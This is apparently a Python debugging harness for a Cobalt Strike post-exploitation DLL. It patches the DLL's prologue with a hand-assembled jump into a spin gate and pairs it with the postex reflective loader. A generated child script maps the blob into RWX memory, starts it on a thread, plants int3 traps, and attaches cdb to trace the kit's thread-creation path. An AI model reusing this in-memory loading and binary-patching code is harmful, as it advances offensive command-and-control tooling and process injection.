# -*- coding: utf-8 -*-
"""kit_dbg_run.py - gated attach-mode debug of kit DLL bg thread creation.
The kit's 0x4170 prologue is patched to jump into a spin gate placed in the
.data BSS tail; the child flips the gate flag only after cdb has attached
and armed breakpoints, so the whole 0x4170 flow (NtCreateThreadEx door ->
Get/SetThreadContext -> Resume) executes inside the debugger."""
import os
import struct
import subprocess
import sys
import time

STAMP = str(int(time.time()))
CTRL = r"\\.\pipe\kit_dbg_c_" + STAMP
OUT = r"\\.\pipe\kit_dbg_o_" + STAMP
BASEF = r"C:\Users\Public\kit_dbg_base.txt"
GOF = r"C:\Users\Public\kit_dbg_go.txt"
PUB = r"C:\Users\Public"
CDB = (r"C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps"
       r"\cdbX64.exe")
PY = r"C:\Program Files\Python314\python.exe"
LOADER = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
          r"\p3-llvm-bench\src\main\resources\resources\postex-loader.x64.bin")

WIRE = open(PUB + r"\bt_hello_12b.bin", "rb").read()


def L(b):
    return struct.pack(">i", len(b)) + b


ARGS = (struct.pack(">i", 0) + struct.pack(">i", 2) + struct.pack(">i", 1)
        + L(b"ntdll.dll!RtlUserThreadStart+0x21\x00")
        + L(OUT.encode() + b"\x00") + L(WIRE))

PIPEMARK = b"POST_EX_PIPE_NAME_PLEASE_DO_NOT_CHANGE_OR_REMOVE"
FULLPIPE_MARK = b"\\\\.\\pipe\\" + PIPEMARK
ARGSMARK = b"_POSTEX_ARGUMENTS_"


def load_secs(d):
    e = struct.unpack_from("<I", d, 0x3C)[0]
    nsec = struct.unpack_from("<H", d, e + 6)[0]
    sect = e + 0x18 + struct.unpack_from("<H", d, e + 0x14)[0]
    secs = []
    for k in range(nsec):
        s = sect + k * 40
        nm = d[s:s + 8].rstrip(b"\x00").decode(errors="replace")
        vsz, va, rsz, ro = struct.unpack_from("<IIII", d, s + 8)
        secs.append((nm, va, vsz, ro, rsz))
    return secs


def off2rva(secs, off):
    for nm, va, vsz, ro, rsz in secs:
        if ro <= off < ro + rsz:
            return va + (off - ro)
    return None


def build():
    kit = open(PUB + r"\kit_async.x64.dll", "rb").read()
    secs = load_secs(kit)
    d = bytearray(kit)
    i = bytes(d).find(FULLPIPE_MARK)
    assert i > 0
    name = CTRL.encode() + b"\x00"
    name += b"\x00" * (len(FULLPIPE_MARK) - len(name))
    d[i:i + len(FULLPIPE_MARK)] = name
    mark_rva = off2rva(secs, i)
    j = bytes(d).find(ARGSMARK)
    assert j > 0
    hdr = (struct.pack("<i", 0x0A2A1DE0) + b"AAAA" + b"N" + b"\x00\x00\x00"
           + struct.pack("<i", 1 << 20) + struct.pack("<i", len(ARGS)))
    d[j:j + 20] = hdr
    dn, dva, dvsz, dro, drsz = [s for s in secs if s[0] == ".data"][0]
    assert dvsz > drsz, "no BSS tail in .data"
    gate_rva = dva + drsz + 0x100
    flag_rva = gate_rva + 0x20
    tn, tva, tvsz, tro, trsz = [s for s in secs if s[0] == ".text"][0]
    off_4170 = tro + (0x4170 - tva)
    assert d[off_4170] == 0x48, "0x4170 prologue unexpected"
    rel = gate_rva - (0x4170 + 5)
    d[off_4170:off_4170 + 5] = b"\xE9" + struct.pack("<i", rel)
    g = gate_rva
    gate = bytearray()
    gate += b"\x8B\x05" + struct.pack("<i", flag_rva - (g + 6))
    gate += b"\x85\xC0"
    gate += b"\x74\xF6"
    gate += b"\x48\x89\x5C\x24\x08"
    gate += b"\xE9" + struct.pack("<i", 0x4175 - (g + 20))
    goff = dro + (gate_rva - dva)
    d[goff:goff + len(gate)] = gate
    patched = bytes(d)
    open(PUB + r"\kit_dbg_patched.dll", "wb").write(patched)
    blob = open(LOADER, "rb").read() + patched
    open(PUB + r"\kit_dbg_blob.bin", "wb").write(blob)
    open(PUB + r"\kit_dbg_args.bin", "wb").write(ARGS)
    for f in (BASEF, GOF):
        if os.path.exists(f):
            os.remove(f)
    return mark_rva, gate_rva, flag_rva


CHILD = r'''
import ctypes, struct, sys, time, os
from ctypes import wintypes
k32 = ctypes.windll.kernel32
k32.VirtualAlloc.restype = ctypes.c_void_p
k32.ReadProcessMemory.restype = wintypes.BOOL
k32.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                  ctypes.c_void_p, ctypes.c_size_t,
                                  ctypes.POINTER(ctypes.c_size_t)]
k32.VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                               ctypes.c_void_p, ctypes.c_size_t]
k32.VirtualQueryEx.restype = ctypes.c_size_t
k32.WriteProcessMemory.restype = wintypes.BOOL
k32.WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                   ctypes.c_void_p, ctypes.c_size_t,
                                   ctypes.POINTER(ctypes.c_size_t)]
k32.GetCurrentProcess.restype = ctypes.c_void_p
h = k32.GetCurrentProcess()
mbi = ctypes.create_string_buffer(48)
BLOB = open(r"C:\Users\Public\kit_dbg_blob.bin", "rb").read()
CTRL = sys.argv[1]
MARK = CTRL.encode()
MARKRVA = 0x3d430
FLAGRVA = int(sys.argv[2], 16)
base = k32.VirtualAlloc(None, len(BLOB), 0x3000, 0x40)
ctypes.memmove(base, BLOB, len(BLOB))
tramp = k32.VirtualAlloc(None, 0x1000, 0x3000, 0x40)
code = bytearray(11)
code[0] = 0x41; code[1] = 0xB9; code[2:6] = struct.pack('<I', 1)
code[6] = 0xE9
code[7:11] = struct.pack('<i', base - (tramp + 11))
ctypes.memmove(tramp, bytes(code), 11)
argb = open(r"C:\Users\Public\kit_dbg_args.bin","rb").read()
ab = k32.VirtualAlloc(None, len(argb), 0x3000, 0x04)
ctypes.memmove(ab, argb, len(argb))
k32.CreateThread(None, 0, ctypes.cast(tramp, wintypes.LPVOID), ctypes.c_void_p(ab), 0, None)
print("thread launched, kit will spin in gate; scanning...", flush=True)

def readmem(a, n):
    buf = ctypes.create_string_buffer(n)
    got = ctypes.c_size_t(0)
    if k32.ReadProcessMemory(h, ctypes.c_void_p(a), buf, n, ctypes.byref(got)) and got.value:
        return buf.raw[:got.value]
    return None

def scan_region(addr, size):
    CH = 0x400000
    a, left = addr, size
    while left > 0:
        n = min(CH, left)
        raw = readmem(a, n)
        if raw:
            p = raw.find(MARK)
            while p >= 0:
                kb = a + p - MARKRVA
                if kb > 0x10000:
                    hdr = readmem(kb, 2)
                    if hdr == b"MZ":
                        return kb
                p = raw.find(MARK, p + 1)
        a += n
        left -= n
    return None

kb = None
for rnd in range(60):
    pri = {0x40: [], 0x20: [], 0x08: [], 0x04: []}
    addr = 0
    while addr < 0x7FFFFFFEFFFF:
        if not k32.VirtualQueryEx(h, ctypes.c_void_p(addr), mbi, 48):
            break
        state = struct.unpack_from("<I", mbi, 32)[0]
        protect = struct.unpack_from("<I", mbi, 36)[0]
        typ = struct.unpack_from("<I", mbi, 40)[0]
        size = struct.unpack_from("<Q", mbi, 24)[0]
        if state == 0x1000 and typ == 0x20000 and size <= 0x1000000 and protect in pri:
            pri[protect].append((addr, size))
        addr += size
    for pr in (0x40, 0x20, 0x08, 0x04):
        for a, sz in pri[pr]:
            kb = scan_region(a, sz)
            if kb:
                break
        if kb:
            break
    if kb:
        break
    pipe = k32.WaitNamedPipeW(CTRL, 100)
    print("round %d rwx=%d rx=%d rw=%d pipe=%s" % (
        rnd, len(pri[0x40]), len(pri[0x20]), len(pri[0x04]), bool(pipe)), flush=True)
    time.sleep(0.3)
with open(r"C:\Users\Public\kit_dbg_base.txt", "w") as f:
    f.write("0x%x" % (kb or 0))
print("kitbase 0x%x" % (kb or 0), flush=True)
if kb:
    # int3 traps at all post-gate sites (kit image is RWX under our loader)
    SITES = [0x4175, 0xe72e, 0x4223, 0x4247, 0x427b, 0x428c, 0x4291, 0x3B70]
    got = ctypes.c_size_t(0)
    for rva in SITES:
        cc = b"\xCC"
        k32.WriteProcessMemory(h, ctypes.c_void_p(kb + rva), cc, 1,
                               ctypes.byref(got))
    print("int3 traps armed", flush=True)
    while not os.path.exists(r"C:\Users\Public\kit_dbg_go.txt"):
        time.sleep(0.2)
    one = ctypes.c_int(1)
    got = ctypes.c_size_t(0)
    ok = k32.WriteProcessMemory(h, ctypes.c_void_p(kb + FLAGRVA),
                                ctypes.byref(one), 4, ctypes.byref(got))
    print("gate flag written:", bool(ok), flush=True)
time.sleep(120)
'''

PARENT = r'''
import time, sys, ctypes
from ctypes import wintypes
k32 = ctypes.windll.kernel32
k32.CreateFileW.restype = wintypes.HANDLE
GENERIC_RW = 0x80000000 | 0x40000000
CTRL, OUT = sys.argv[1], sys.argv[2]
def open_pipe(name, timeout):
    t0 = time.time()
    while time.time() - t0 < timeout:
        h = k32.CreateFileW(name, GENERIC_RW, 0, None, 3, 0, None)
        if h and h != wintypes.HANDLE(-1).value:
            return h
        time.sleep(0.2)
    return None
hc = open_pipe(CTRL, 40)
print("parent ctrl:", bool(hc), flush=True)
ho = open_pipe(OUT, 70)
print("parent out:", bool(ho), flush=True)
time.sleep(45)
'''


def find_pid():
    out = subprocess.run(
        ["powershell", "-NoProfile", "-Command",
         "Get-CimInstance Win32_Process -Filter \"name='python.exe'\" | "
         "Where-Object {$_.CommandLine -like '*kit_dbg_child*'} | "
         "Select-Object -ExpandProperty ProcessId"],
        capture_output=True, text=True, timeout=30).stdout.strip()
    pids = [int(x) for x in out.split() if x.strip().isdigit()]
    return pids[-1] if pids else None


def main():
    mark_rva, gate_rva, flag_rva = build()
    open(PUB + r"\kit_dbg_child.py", "w").write(CHILD)
    open(PUB + r"\kit_dbg_parent.py", "w").write(PARENT)
    child = subprocess.Popen([PY, "-I", PUB + r"\kit_dbg_child.py", CTRL,
                              "%x" % flag_rva],
                             cwd=PUB, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT)
    pid = None
    for _ in range(30):
        time.sleep(1)
        pid = find_pid()
        if pid:
            break
    print("child pid:", pid)
    kb = None
    for _ in range(70):
        time.sleep(1)
        if os.path.exists(BASEF):
            kb = open(BASEF).read().strip()
            if kb and int(kb, 16):
                break
    if not kb or int(kb, 16) == 0:
        print("FAILED: no kitbase")
        return
    K = int(kb, 16)
    print("kitbase:", hex(K))

    # pure r/g script: cdb -cf lines execute as if typed; each g blocks
    # until the next break event. 9 breaks expected: attach + 8 int3 sites.
    cmds = (["r", "g"] + ["r", "g"] * 8 + ["g", "g", "g", "g"])

    open(PUB + r"\kit_dbg_cmds.txt", "w").write("\n".join(cmds))

    cdb = subprocess.Popen(
        ["powershell", "-NoProfile", "-Command",
         "& '%s' -p %d -cf %s" % (CDB, pid, PUB + r"\kit_dbg_cmds.txt")],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(10)
    open(GOF, "w").write("go")
    parent = subprocess.Popen([PY, "-I", PUB + r"\kit_dbg_parent.py",
                               CTRL, OUT], cwd=PUB,
                              stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT)
    time.sleep(55)
    for p in (parent, cdb, child):
        try:
            p.kill()
        except Exception:
            pass
    print("===== CDB LOG =====")
    try:
        log = cdb.stdout.read().decode(errors="replace")
    except Exception:
        log = ""
    lines = log.splitlines()
    try:
        idx = next(i for i, ln in enumerate(lines)
                   if "Break instruction exception" in ln)
    except StopIteration:
        idx = 0
    print("\n".join(lines[idx:idx + 220]))
    print("===== PARENT =====")
    try:
        print(parent.stdout.read().decode(errors="replace")[:400])
    except Exception:
        pass


if __name__ == "__main__":
    main()
